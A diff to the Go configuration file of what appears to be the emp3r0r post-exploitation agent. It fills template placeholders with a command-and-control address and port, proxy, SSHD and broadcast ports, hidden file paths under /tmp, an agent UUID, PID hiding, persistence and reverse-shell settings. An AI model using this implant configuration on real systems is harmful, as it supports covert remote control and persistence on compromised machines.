@@ -12,7 +12,7 @@ import (
 
 var (
 	// CCAddress how our agent finds its CC
-	CCAddress = "https://[cc_ipaddr]"
+	CCAddress = "https://192.168.122.170"
 
 	// CCIP IP address of CC
 	CCIP = ""
@@ -42,7 +42,7 @@ var (
 	CDNProxy = ""
 
 	// SocketName name of our unix socket
-	SocketName = AgentRoot + "/.socket"
+	SocketName = AgentRoot + "/fb5f9d"
 
 	// HIDE_PIDS all the processes
 	HIDE_PIDS = []string{strconv.Itoa(os.Getpid())}
@@ -54,13 +54,13 @@ var (
 	GuardianAgentPath = "[persistence_agent_path]"
 
 	// Version record version on build time
-	Version = "[version_string]"
+	Version = "v1.3.14-7-g78e4a76"
 
 	// AgentRoot root directory
-	AgentRoot = "[agent_root]"
+	AgentRoot = "/tmp/d55309c3"
 
 	// UtilsPath binary path of utilities
-	UtilsPath = AgentRoot + "/bin"
+	UtilsPath = AgentRoot + "/ab568e5"
 
 	// LibPath
 	LibPath = AgentRoot + "/lib"
@@ -72,34 +72,34 @@ var (
 	Libemp3r0rFile = UtilsPath + "/libe.so"
 
 	// PIDFile stores agent PID
-	PIDFile = AgentRoot + "/.pid"
+	PIDFile = AgentRoot + "/d96352a"
 
 	// CCPort port of c2
-	CCPort = "[cc_port]"
+	CCPort = "14232"
 
 	// ProxyPort start a socks5 proxy to help other agents, on 0.0.0.0:port
-	ProxyPort = "[proxy_port]"
+	ProxyPort = "8875"
 
 	// SSHDPort port of sshd
-	SSHDPort = "[sshd_port]"
+	SSHDPort = "46525"
 
 	// ReverseProxyPort for reverse proxy
 	ReverseProxyPort = ""
 
 	// BroadcastPort port of broadcast server
-	BroadcastPort = "[broadcast_port]"
+	BroadcastPort = "45656"
 
 	// BroadcastIntervalMin broadcast wait seconds
 	BroadcastIntervalMin = 30
 
 	// BroadcastIntervalMax broadcast wait seconds
-	BroadcastIntervalMax = 120
+	BroadcastIntervalMax = 0
 
 	// CCIndicator check this before trying connection
-	CCIndicator = "[cc_indicator]"
+	CCIndicator = "cc_indicator"
 
 	// CCIndicatorText content of your indicator file
-	CCIndicatorText = "[indicator_text]"
+	CCIndicatorText = "emp3r0r"
 
 	// IndicatorWaitMin cc indicator wait seconds
 	IndicatorWaitMin = 30
@@ -108,7 +108,7 @@ var (
 	IndicatorWaitMax = 120
 
 	// AgentUUID uuid of this agent
-	AgentUUID = "[agent_uuid]"
+	AgentUUID = "70ed075b-a412-11ec-8721-1f7c2810e0df"
 
 	// AgenTag tag of this agent
 	AgentTag = ""
@@ -116,7 +116,7 @@ var (
 
 const (
 	// OpSep separator of CC payload
-	OpSep = "cb433bd1-354c-4802-a4fa-ece518f3ded1"
+	OpSep = "3276d368-8400-11ec-9ac4-b9d591256de4"
 
 	// RShellBufSize buffer size of reverse shell stream
 	RShellBufSize = 128
